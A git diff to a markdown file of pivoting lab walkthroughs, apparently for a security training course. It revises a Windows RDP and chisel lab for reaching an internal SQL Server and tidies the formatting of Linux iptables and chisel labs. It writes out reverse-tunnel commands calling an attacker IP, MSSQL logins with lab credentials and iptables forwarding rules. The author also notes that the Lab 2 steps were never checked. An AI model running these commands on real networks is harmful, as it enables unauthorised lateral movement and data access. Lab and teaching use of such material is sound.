@@ -45,22 +45,19 @@ Compromised Windows machine must be accessible with valid credentials.
     gunzip chisel_1.9.1_linux_amd64.gz
     mv chisel_1.9.1_linux_amd64 chisel
 
-   # Download and clean-up the Windows version of Chisel v1.9.1
+    # Download and clean-up the Windows version of Chisel v1.9.1
     wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
     gunzip chisel_1.9.1_windows_amd64.gz
     mv chisel_1.9.1_windows_amd64 chisel.exe
-    ```
-
-   - Start a listener on the attacking machine:
+       ```
+   - Start a listener on the attcking machine:
    ```bash
    ./chisel server --port 5000 --reverse
    ```
-
    - Copy the exe version to victim computer and execute it:
    ```bash
    .\chisel.exe client <ATTACKER_IP>:5000 R:8888:127.0.0.1:8000
-   ```
-   
+   ``
    - Get the flag in your attacking machine from the internal network .
    ```bash
    curl localhost:8888
@@ -70,55 +67,99 @@ Compromised Windows machine must be accessible with valid credentials.
 Compromised Windows hosts with network access allow attackers to pivot by routing traffic through them with chisel.
 
 #### Alternatives
-    - Use netsh for port forwarding on Windows.
+- Use netsh for port forwarding on Windows.
 
 #### Resources
-    - [Metasploit Pivoting Guide: https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
+- [Metasploit Pivoting Guide: https://www.offensive-security.com/metasploit-unleashed/pivoting/](https://www.offensive-security.com/metasploit-unleashed/pivoting/)
 
 #### Notes
-    -   TO-DO.
+-   TO-DO.
 
 ---
 
 ### Lab 2: Pivoting Windows Task
 #### Objective
-Pivot through a Windows machine to compromise another internal host.
+Pivot through a Windows machine using RDP and `chisel` to access an internal SQL Server and retrieve a flag from its database. BEWARE: While writing the walkthrough for this lab, the vm was unavailable so I did not proof-check the steps. I will delete this notice when i will do the proof-checking, but it should work :)
 
 #### Vulnerabilities
-    - Weak Credentials: Reusable credentials on internal hosts enable lateral movement.
+- Open RDP Service: RDP access on the Windows host (`<TARGET_IP>`) allows execution of tools like `chisel`.
+- Weak SQL Credentials: Reusable `sa` credentials enable access to the internal SQL Server.
 
 #### Requirements
-Compromised Windows machine must have administrative access to another internal host.
+- RDP access to the Windows host with credentials `user:ohX8haer8aexoo7d`.
+- MSSQL credentials `sa:euteiGhaetah2ohy` for the SQL Server (`10.152.152.11:1433`).
+- `chisel` binary for port forwarding and `impacket-mssqlclient` for database access.
 
 #### Steps
 1. **Setup**
-   - Verify administrative access on the pivot host.
-   ```bash
-   net use \\<WINDOWS_IP> /user:domain\user <PASSWORD>
-   ```
+   - Verify RDP access to the Windows host:
+     ```bash
+     xfreerdp /u:user /p:ohX8haer8aexoo7d /v:10.10.0.48 +clipboard /dynamic-resolution
+     ```
+   - Download `chisel` for Windows:
+     ```bash
+     wget https://github.com/jpillora/chisel/releases/download/v1.10.0/chisel_1.10.0_windows_amd64.gz
+     gunzip chisel_1.10.0_windows_amd64.gz
+     mv chisel_1.10.0_windows_amd64 chisel.exe
+     ```
+   - Transfer `chisel.exe` to the Windows host via RDP (e.g., clipboard or shared drive or python http server). Check Lab 1 for reference.
+
 2. **Reconnaissance**
-   - Enumerate internal hosts using PowerShell.
-   ```powershell
-   Get-NetComputer -Domain domain.local
-   ```
+   - Confirm network access to the internal SQL Server (`10.152.152.11:1433`) from the Windows host. In a Windows command prompt:
+     ```cmd
+     telnet 10.152.152.11 1433
+     ```
+     (If `telnet` is unavailable, assume connectivity based on task context.)
+
 3. **Exploitation**
-   - Use PsExec to execute commands on the internal host.
-   ```bash
-   impacket-psexec domain.local/user:<PASSWORD>@<INTERNAL_IP> cmd.exe
-   ```
+   - Start a `chisel` server on your attacking machine:
+     ```bash
+     ./chisel server -p 8000 --reverse
+     ```
+   - On the Windows host, run `chisel` client to forward the SQL Server port:
+     ```cmd
+     chisel.exe client <ATTACKER_IP>:8000 R:1433:10.152.152.11:1433
+     ```
+     Replace `<ATTACKER_IP>` with your machine’s IP (e.g., `100.100.75.242`).
+   - Connect to the SQL Server via the forwarded port:
+     ```bash
+     impacket-mssqlclient sa:euteiGhaetah2ohy@127.0.0.1 -port 1433
+     ```
+   - Enumerate databases and tables to find the flag:
+     ```sql
+     SELECT name FROM sys.databases;
+     USE <database_name>;
+     SELECT table_name FROM information_schema.tables;
+     SELECT * FROM <table_name>;
+     ```
+     Example output:
+     ```sql
+     flag_column
+     --------------------
+     cybered{...}
+     ```
 
 #### Why It Works
-Administrative access and weak credentials allow command execution on internal hosts via the pivot.
+RDP provides access to the Windows host, allowing execution of `chisel` to create a reverse tunnel. This tunnel forwards the internal SQL Server’s port (`10.152.152.11:1433`) to `127.0.0.1:1433` on your local machine, enabling `impacket-mssqlclient` to connect using the provided credentials. The `sa` account’s weak credentials allow full database access to retrieve the flag.
 
 #### Alternatives
-    - Use WMI for remote command execution.
+- Use SSH tunneling (if available) instead of `chisel`:
+  ```bash
+  ssh -L 1433:10.152.152.11:1433 user@10.10.0.48
+  ```
+- Use `mssqlclient.py` from a different toolset if `impacket` fails.
 
 #### Resources
-    - [Impacket PsExec: https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
+- [Chisel Documentation: https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)
+- [Impacket MSSQL Client: https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket)
 
 #### Notes
-    - Verify domain credentials before attempting PsExec.
-
+- Ensure port 8000 is open on your local machine for the `chisel` server.
+- If the flag is not in a table, check views or stored procedures:
+  ```sql
+  SELECT name FROM sys.objects WHERE type IN ('V', 'P');
+  ```
+- Verify the SQL Server IP and port if connection fails.
 ---
 
 ### Lab 3: Pivoting using built-in Linux capabilities Task
@@ -126,28 +167,28 @@ Administrative access and weak credentials allow command execution on internal h
 Pivot through a Linux machine using built-in `iptables` to forward DNS traffic and access a TXT record from an internal DNS server.
 
 #### Vulnerabilities
-    - Open SSH Service: SSH access on the intermediate host (`10.10.0.48`) with `iptables` as the login shell enables configuration of port forwarding rules.
-    - IP Forwarding Enabled: Allows routing of packets to the internal network.
+- Open SSH Service: SSH access on the intermediate host (`10.10.0.48`) with `iptables` as the login shell enables configuration of port forwarding rules.
+- IP Forwarding Enabled: Allows routing of packets to the internal network.
 
 #### Requirements
-    - SSH access to the intermediate host (`10.10.0.48:2222`) with credentials `root:c3898f5ff5f5576be10a81aeadf55d74`.
-    - Ability to configure `iptables` rules to forward traffic to the internal DNS server (`10.152.152.11:53`).
+- SSH access to the intermediate host (`10.10.0.48:2222`) with credentials `root:c3898f5ff5f5576be10a81aeadf55d74`.
+- Ability to configure `iptables` rules to forward traffic to the internal DNS server (`10.152.152.11:53`).
 
 #### Steps
 1. **Setup**
-    - Verify SSH access to the intermediate host:
-    ```bash
-    ssh -p 2222 root@10.10.0.48 -- --help
-    ```
-    This confirms the `iptables` shell is active and accepts arguments.
+- Verify SSH access to the intermediate host:
+ ```bash
+ ssh -p 2222 root@10.10.0.48 -- --help
+ ```
+ This confirms the `iptables` shell is active and accepts arguments.
 
 2. **Reconnaissance**
-    - Check existing `iptables` NAT rules to ensure no conflicting configurations:
-    ```bash
-    ssh -p 2222 root@10.10.0.48 -- -t nat -L -v -n
-    ```
-    Output shows no initial rules in the NAT table.
-    - Optionally, you may reset it `ssh -p 2222 root@10.10.0.48 -- -t nat -F`
+- Check existing `iptables` NAT rules to ensure no conflicting configurations:
+ ```bash
+ ssh -p 2222 root@10.10.0.48 -- -t nat -L -v -n
+ ```
+ Output shows no initial rules in the NAT table.
+- Optionally, you may reset it `ssh -p 2222 root@10.10.0.48 -- -t nat -F`
 
 3. **Exploitation**
    - Configure `iptables` to forward DNS traffic (TCP and UDP) from port 10000 on the intermediate host to the internal DNS server (`10.152.152.11:53`):
@@ -182,24 +223,24 @@ Pivot through a Linux machine using built-in `iptables` to forward DNS traffic a
      ```
 
 #### Why It Works
-    - The `iptables` rules in the `nat` table (`PREROUTING` and `POSTROUTING`) redirect incoming DNS queries on port 10000 to the internal DNS server (`10.152.152.11:53`). The `MASQUERADE` rule ensures return traffic is routed correctly, leveraging the enabled IP forwarding. The `INPUT` chain rules allow external access to port 10000 on the intermediate host.
+- The `iptables` rules in the `nat` table (`PREROUTING` and `POSTROUTING`) redirect incoming DNS queries on port 10000 to the internal DNS server (`10.152.152.11:53`). The `MASQUERADE` rule ensures return traffic is routed correctly, leveraging the enabled IP forwarding. The `INPUT` chain rules allow external access to port 10000 on the intermediate host.
 
 #### Alternatives
-    - Use SSH dynamic port forwarding (if not blocked) to create a SOCKS proxy and route DNS queries through it.
-    - Example:
-    ```bash
-    ssh -p 2222 root@10.10.0.48 -D 9050
-    dig @10.152.152.11 -p 53 flag.pivoting.local TXT +tcp -S socks5://127.0.0.1:9050
-    ```
+- Use SSH dynamic port forwarding (if not blocked) to create a SOCKS proxy and route DNS queries through it.
+- Example:
+  ```bash
+  ssh -p 2222 root@10.10.0.48 -D 9050
+  dig @10.152.152.11 -p 53 flag.pivoting.local TXT +tcp -S socks5://127.0.0.1:9050
+  ```
 
 #### Resources
-    - [iptables NAT Guide: https://www.netfilter.org/documentation/HOWTO/NAT-HOWTO.html](https://www.netfilter.org/documentation/HOWTO/NAT-HOWTO.html)
-    - [DNS Query with dig: https://linux.die.net/man/1/dig](https://linux.die.net/man/1/dig)
+- [iptables NAT Guide: https://www.netfilter.org/documentation/HOWTO/NAT-HOWTO.html](https://www.netfilter.org/documentation/HOWTO/NAT-HOWTO.html)
+- [DNS Query with dig: https://linux.die.net/man/1/dig](https://linux.die.net/man/1/dig)
 
 #### Notes
-    - Ensure port 10000 is not blocked by external firewalls. If connectivity fails, try another port in the range 10000–10010.
-    - The `+tcp` flag in `dig` ensures TCP-based DNS queries, which may be more reliable in some network configurations.
-    - The IP 10.10.0.48 corresponds to the <TARGET_IP> or intermediate host.
+- Ensure port 10000 is not blocked by external firewalls. If connectivity fails, try another port in the range 10000–10010.
+- The `+tcp` flag in `dig` ensures TCP-based DNS queries, which may be more reliable in some network configurations.
+- The IP 10.10.0.48 corresponds to the <TARGET_IP> or intermediate host.
 
 ---
 
@@ -505,5 +546,3 @@ The DMZ host’s access to internal networks allows attackers to tunnel traffic 
 
 #### Notes
 - Ensure the DMZ host allows reverse SSH connections.
-
----
